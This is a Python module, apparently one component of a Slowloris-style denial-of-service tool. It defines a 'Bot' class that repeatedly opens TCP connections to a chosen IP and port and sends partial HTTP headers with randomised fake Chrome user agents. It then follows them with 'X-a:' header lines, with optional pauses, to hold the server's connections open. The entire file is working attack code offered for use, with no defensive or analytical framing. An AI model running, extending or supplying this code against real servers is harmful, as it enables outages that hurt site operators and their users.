# Date: 09/24/2018
# Author: Pure-L0G1C
# Description: Bot

import socket
from time import sleep
from .config import header
from random import randint, choice  
from string import ascii_lowercase

class Useragent(object):

 @property
 def get_win_version(self):
  versions = []
  version = 4.0
  while version <= 10:
   versions.append(version)
   version = round(version+0.1, 2)
  return choice(versions)
  
 @property 
 def get_chrome_version(self):
  a = randint(40, 69)
  b = randint(2987, 3497)
  c = randint(80, 140)
  return '{}.0.{}.{}'.format(a, b, c)

 def get(self):
  a = 'Mozilla/5.0 (Windows NT {}; Win64; x64)'.format(self.get_win_version)
  b = 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{} Safari/537.36'.format(self.get_chrome_version)
  return '{} {}'.format(a, b)

class Session(object):

 def __init__(self, ip, port):
  self.ip = ip
  self.port = port 
  self.session = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   
 def connect(self, header):
  is_connected = False 
  try:
   self.session.connect((self.ip, self.port))
   self.send_packet(header)
   is_connected = True 
  except:pass
  finally:
   return is_connected

 def send_packet(self, packet):
  sent = False
  try:
   self.session.sendall(packet)
   sent = True  
  except:pass
  finally:
   return sent

 def close(self):
  try:
   self.session.close()
  except:pass 

class Bot(object):

 def __init__(self, ip, port, is_aggressive):
  self.ip = ip 
  self.port = port 
  self.session = None 
  self.is_alive = True
  self.useragent = None
  self.useragent_usage = 0
  self.max_useragent_usage = 16
  self.useragent_obj = Useragent()
  self.is_aggressive = is_aggressive

 def sleep(self):
  for _ in range(randint(5, 10)):
   if self.is_alive:
    sleep(1)
  
 def start(self):
  while self.is_alive:
   try:
    self.get_session()
    if not self.session.connect(self.header):
     self.session.close()
   except:pass 
   else:
    for _ in range(2):
     pkt = self.packet
     if not self.is_alive:break
     if self.session.send_packet(pkt):
      if not self.is_aggressive:self.sleep()
     else:
      break      
    self.session.close()

 def stop(self):
  self.is_alive = False 
  if self.session:
   self.session.close()

 def gen_useragent(self):
  if not self.useragent_usage:
   self.useragent = self.useragent_obj.get()
  self.useragent_usage = 0 if self.useragent_usage >= self.max_useragent_usage else self.useragent_usage+1

 @property 
 def header(self):
  self.gen_useragent()
  return header.format(self.text, self.useragent).encode()  

 @property 
 def packet(self):
  return 'X-a: {}\r\n\r\n'.format(self.text).encode() 

 @property 
 def text(self):
  printables = ascii_lowercase + ''.join([str(_) for _ in range(10)])
  return ''.join([choice(printables) for _ in range(randint(3, 9))])

 def get_session(self):
  self.session = Session(self.ip, self.port)
